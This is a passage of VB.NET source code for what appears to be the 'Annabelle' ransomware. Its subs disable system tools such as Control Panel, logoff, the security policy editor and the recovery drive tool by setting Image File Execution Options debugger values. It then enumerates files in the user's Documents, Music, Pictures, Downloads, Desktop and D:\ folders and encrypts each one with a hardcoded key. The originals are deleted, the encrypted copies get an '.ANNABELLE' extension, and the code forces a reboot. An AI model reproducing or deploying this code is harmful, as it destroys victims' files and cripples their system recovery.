        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mpg4dmod.dll", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mpg4dmod.dll", True)
        key.SetValue("Debugger", "RIP")
        SendNotifyMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0)
    End Sub
    Public Sub Mydocs()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mydocs.dll", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mydocs.dll", True)
        key.SetValue("Debugger", "RIP")
        SendNotifyMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0)
    End Sub
    Public Sub Rasman()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\rasman.dll", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\rasman.dll", True)
        key.SetValue("Debugger", "RIP")
        SendNotifyMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0)
    End Sub
    Public Sub Shellstyle()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\shellstyle.dll", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\shellstyle.dll", True)
        key.SetValue("Debugger", "RIP")
        SendNotifyMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0)
    End Sub
    Public Sub Secpol()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\secpol.msc", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\secpol.msc", True)
        key.SetValue("Debugger", "RIP")
        SendNotifyMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0)
    End Sub
    Public Sub Url()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\url.dll", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\url.dll", True)
        key.SetValue("Debugger", "RIP")
        SendNotifyMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0)
    End Sub
    Public Sub Usbui()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\usbui.dll", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\usbui.dll", True)
        key.SetValue("Debugger", "RIP")
        SendNotifyMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0)
    End Sub
    Public Sub Webcheck()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\webcheck.dll", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\webcheck.dll", True)
        key.SetValue("Debugger", "RIP")
        SendNotifyMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0)
    End Sub
    Public Sub Recoverydrive()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\recoverydrive.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\recoverydrive.exe", True)
        key.SetValue("Debugger", "RIP")
        SendNotifyMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0)
    End Sub
    Public Sub Logoff()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\logoff.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\logoff.exe", True)
        key.SetValue("Debugger", "RIP")
        SendNotifyMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0)
    End Sub
    Public Sub Control()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\control.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\control.exe", True)
        key.SetValue("Debugger", "RIP")
        SendNotifyMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0)
        Try
            For Each foundDirectory As String In
                               My.Computer.FileSystem.GetDirectories(
                                   My.Computer.FileSystem.SpecialDirectories.MyDocuments,
                                   FileIO.SearchOption.SearchTopLevelOnly)
                For Each foundFile As String In My.Computer.FileSystem.GetFiles(
            foundDirectory)
                    If foundFile.EndsWith("desktop.ini") Then
                    Else
                        ListBox1.Items.Add(foundFile)
                    End If
                Next
            Next

        Catch ex As Exception

        End Try
        Try
            For Each foundFile2 As String In My.Computer.FileSystem.GetFiles(
          My.Computer.FileSystem.SpecialDirectories.MyDocuments)

                If foundFile2.EndsWith("desktop.ini") Then
                Else
                    ListBox1.Items.Add(foundFile2)
                End If
            Next
        Catch ex As Exception

        End Try
        Try
            For Each foundDirectory3 As String In
                               My.Computer.FileSystem.GetDirectories(
                                   My.Computer.FileSystem.SpecialDirectories.MyMusic,
                                   FileIO.SearchOption.SearchTopLevelOnly)
                For Each foundFile3 As String In My.Computer.FileSystem.GetFiles(
            foundDirectory3)

                    If foundFile3.EndsWith("desktop.ini") Then
                    Else
                        ListBox1.Items.Add(foundFile3)
                    End If
                Next
            Next

        Catch ex As Exception

        End Try
        Try
            For Each foundFile4 As String In My.Computer.FileSystem.GetFiles(
       My.Computer.FileSystem.SpecialDirectories.MyMusic)

                If foundFile4.EndsWith("desktop.ini") Then
                Else
                    ListBox1.Items.Add(foundFile4)
                End If
            Next
        Catch ex As Exception

        End Try
        Try
            For Each foundDirectory3 As String In
                               My.Computer.FileSystem.GetDirectories(
                                   My.Computer.FileSystem.SpecialDirectories.MyPictures,
                                   FileIO.SearchOption.SearchTopLevelOnly)
                For Each foundFile3 As String In My.Computer.FileSystem.GetFiles(
            foundDirectory3)

                    If foundFile3.EndsWith("desktop.ini") Then
                    Else
                        ListBox1.Items.Add(foundFile3)
                    End If
                Next
            Next

        Catch ex As Exception

        End Try
        Try
            For Each foundFile4 As String In My.Computer.FileSystem.GetFiles(
       My.Computer.FileSystem.SpecialDirectories.MyPictures)

                If foundFile4.EndsWith("desktop.ini") Then
                Else
                    ListBox1.Items.Add(foundFile4)
                End If
            Next
        Catch ex As Exception
        End Try
        Try
            For Each foundDirectory3 As String In
                               My.Computer.FileSystem.GetDirectories(
                                   "C:\Users\" + Environment.UserName + "\Downloads",
                                   FileIO.SearchOption.SearchTopLevelOnly)
                For Each foundFile3 As String In My.Computer.FileSystem.GetFiles(
            foundDirectory3)

                    If foundFile3.EndsWith("desktop.ini") Then
                    Else
                        ListBox1.Items.Add(foundFile3)
                    End If
                Next
            Next

        Catch ex As Exception

        End Try
        Try
            For Each foundDirectory3 As String In
            My.Computer.FileSystem.GetDirectories(
                         "C:\Users\" + Environment.UserName + "\Downloads",
                        FileIO.SearchOption.SearchAllSubDirectories)
                For Each foundFile3 As String In My.Computer.FileSystem.GetFiles(
                 foundDirectory3)

                    If foundFile3.EndsWith("desktop.ini") Then
                    Else
                        ListBox1.Items.Add(foundFile3)
                    End If
                Next
            Next

        Catch ex As Exception

        End Try
        Try
            For Each foundFile4 As String In My.Computer.FileSystem.GetFiles("C:\Users\" + Environment.UserName + "\Downloads")

                If foundFile4.EndsWith("desktop.ini") Then
                Else
                    ListBox1.Items.Add(foundFile4)
                End If
            Next
        Catch ex As Exception

        End Try
        Try
            For Each foundDirectory3 As String In
                               My.Computer.FileSystem.GetDirectories(
                                   "C:\Users\" + Environment.UserName + "\Desktop",
                                   FileIO.SearchOption.SearchTopLevelOnly)
                For Each foundFile3 As String In My.Computer.FileSystem.GetFiles(
            foundDirectory3)

                    If foundFile3.EndsWith("desktop.ini") Then
                    Else
                        ListBox1.Items.Add(foundFile3)
                    End If
                Next
            Next

        Catch ex As Exception

        End Try
        Try
            For Each foundDirectory3 As String In
            My.Computer.FileSystem.GetDirectories(
                              "C:\Users\" + Environment.UserName + "\Desktop",
                             FileIO.SearchOption.SearchAllSubDirectories)
                For Each foundFile3 As String In My.Computer.FileSystem.GetFiles(
           foundDirectory3)

                    If foundFile3.EndsWith("desktop.ini") Then
                    Else
                        ListBox1.Items.Add(foundFile3)
                    End If
                Next
            Next

        Catch ex As Exception

        End Try
        Try
            For Each foundFile4 As String In My.Computer.FileSystem.GetFiles("C:\Users\" + Environment.UserName + "\Desktop")
                If foundFile4.EndsWith("desktop.ini") Then
                Else
                    ListBox1.Items.Add(foundFile4)
                End If
            Next
        Catch ex As Exception

        End Try
        Try
            For Each foundDirectory3 As String In
                               My.Computer.FileSystem.GetDirectories(
                                   "D:\",
                                   FileIO.SearchOption.SearchTopLevelOnly)
                For Each foundFile3 As String In My.Computer.FileSystem.GetFiles(
            foundDirectory3)

                    If foundFile3.EndsWith("desktop.ini") Then
                    Else
                        ListBox1.Items.Add(foundFile3)
                    End If
                Next
            Next

        Catch ex As Exception

        End Try
        Timer1.Start()
    End Sub

    Dim strFileToEncrypt As String
    Dim strFileToDecrypt As String
    Dim strOutputEncrypt As String
    Dim strOutputDecrypt As String
    Dim fsInput As System.IO.FileStream
    Dim fsOutput As System.IO.FileStream
    Public Function CreateKey(ByVal strPassword As String) As Byte()
        Dim chrData() As Char = strPassword.ToCharArray
        Dim intLength As Integer = chrData.GetUpperBound(0)
        Dim bytDataToHash(intLength) As Byte

        For i As Integer = 0 To chrData.GetUpperBound(0)
            bytDataToHash(i) = CByte(Asc(chrData(i)))
        Next

        Dim SHA512 As New System.Security.Cryptography.SHA512Managed
        Dim bytResult As Byte() = SHA512.ComputeHash(bytDataToHash)
        Dim bytKey(31) As Byte

        For i As Integer = 0 To 31
            bytKey(i) = bytResult(i)
        Next

        Return bytKey
    End Function
    Public Function CreateIV(ByVal strPassword As String) As Byte()
        Dim chrData() As Char = strPassword.ToCharArray
        Dim intLength As Integer = chrData.GetUpperBound(0)
        Dim bytDataToHash(intLength) As Byte

        For i As Integer = 0 To chrData.GetUpperBound(0)
            bytDataToHash(i) = CByte(Asc(chrData(i)))
        Next

        Dim SHA512 As New System.Security.Cryptography.SHA512Managed
        Dim bytResult As Byte() = SHA512.ComputeHash(bytDataToHash)
        Dim bytIV(15) As Byte

        For i As Integer = 32 To 47
            bytIV(i - 32) = bytResult(i)
        Next

        Return bytIV
    End Function
    Public Enum CryptoAction
        ActionEncrypt = 1
        ActionDecrypt = 2
    End Enum

    Public Sub EncryptOrDecryptFile(ByVal strInputFile As String,
                                     ByVal strOutputFile As String,
                                     ByVal bytKey() As Byte,
                                     ByVal bytIV() As Byte,
                                     ByVal Direction As CryptoAction)
        Try

            fsInput = New System.IO.FileStream(strInputFile, FileMode.Open,
                                               FileAccess.Read)
            fsOutput = New System.IO.FileStream(strOutputFile, FileMode.OpenOrCreate,
                                                FileAccess.Write)
            fsOutput.SetLength(0)

            Dim bytBuffer(4096) As Byte
            Dim lngBytesProcessed As Long = 0
            Dim lngFileLength As Long = fsInput.Length
            Dim intBytesInCurrentBlock As Integer
            Dim csCryptoStream As CryptoStream
            Dim cspRijndael As New System.Security.Cryptography.RijndaelManaged
            pbstatus.Value = 0
            pbstatus.Maximum = 100

            Select Case Direction
                Case CryptoAction.ActionEncrypt
                    csCryptoStream = New CryptoStream(fsOutput,
                    cspRijndael.CreateEncryptor(bytKey, bytIV),
                    CryptoStreamMode.Write)

                Case CryptoAction.ActionDecrypt
                    csCryptoStream = New CryptoStream(fsOutput,
                    cspRijndael.CreateDecryptor(bytKey, bytIV),
                    CryptoStreamMode.Write)
            End Select

            While lngBytesProcessed < lngFileLength
                intBytesInCurrentBlock = fsInput.Read(bytBuffer, 0, 4096)
#Disable Warning BC42104 ' Die csCryptoStream-Variable wird verwendet, bevor ihr ein Wert zugewiesen wird. Zur Laufzeit kann eine Nullverweisausnahme auftreten.
                csCryptoStream.Write(bytBuffer, 0, intBytesInCurrentBlock)
#Enable Warning BC42104 ' Die csCryptoStream-Variable wird verwendet, bevor ihr ein Wert zugewiesen wird. Zur Laufzeit kann eine Nullverweisausnahme auftreten.
                lngBytesProcessed = lngBytesProcessed + CLng(intBytesInCurrentBlock)
                pbstatus.Value = CInt((lngBytesProcessed / lngFileLength) * 100)
            End While

            csCryptoStream.Close()
            fsInput.Close()
            fsOutput.Close()

            If Direction = CryptoAction.ActionEncrypt Then
                Dim fileOriginal As New FileInfo(strFileToEncrypt)
                fileOriginal.Delete()
            End If

            If Direction = CryptoAction.ActionDecrypt Then
                Dim fileEncrypted As New FileInfo(strFileToDecrypt)
                fileEncrypted.Delete()
            End If


        Catch
            fsInput.Close()
            fsOutput.Close()

            If Direction = CryptoAction.ActionDecrypt Then
                Dim fileDelete As New FileInfo(filenamez)
                fileDelete.Delete()



            Else
                Dim fileDelete As New FileInfo(filenamez)
                fileDelete.Delete()




            End If

        End Try
    End Sub


    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        ProgressBar1.Maximum = ListBox1.Items.Count
        If ProgressBar1.Value = ListBox1.Items.Count Then
            Me.ShowInTaskbar = False
            Me.WindowState = FormWindowState.Minimized
            Timer1.Stop()
            Dim path As String = "C:\Save1.txt"

            Dim fs As FileStream = File.Create(path)

            Dim info As Byte() = New UTF8Encoding(True).GetBytes("Save1")
            fs.Write(info, 0, info.Length)
            fs.Close()
            System.Diagnostics.Process.Start("shutdown", "-r -t 00 -f")
        Else

            ListBox1.SelectedIndex = ProgressBar1.Value

            ListBox1.SelectionMode = SelectionMode.One
            filenamez = CStr(ListBox1.SelectedItem)
            Try
                Dim bytKey As Byte()
                Dim bytIV As Byte()
                bytKey = CreateKey("u8gPA4uY6w5CMCgw")
                bytIV = CreateIV("u8gPA4uY6w5CMCgw")
                EncryptOrDecryptFile(filenamez, filenamez + ".ANNABELLE",
                                     bytKey, bytIV, CryptoAction.ActionEncrypt)
            Catch ex As Exception

            End Try
            ProgressBar1.Increment(1)
        End If
    End Sub

    <DllImport("user32.dll", SetLastError:=True, CharSet:=CharSet.Auto)>
    Public Shared Function SendNotifyMessage(
 ByVal hWnd As IntPtr,
 ByVal msg As UInteger,
 ByVal wParam As UIntPtr,
 ByVal lParam As IntPtr
 ) As Boolean
    End Function

End Class
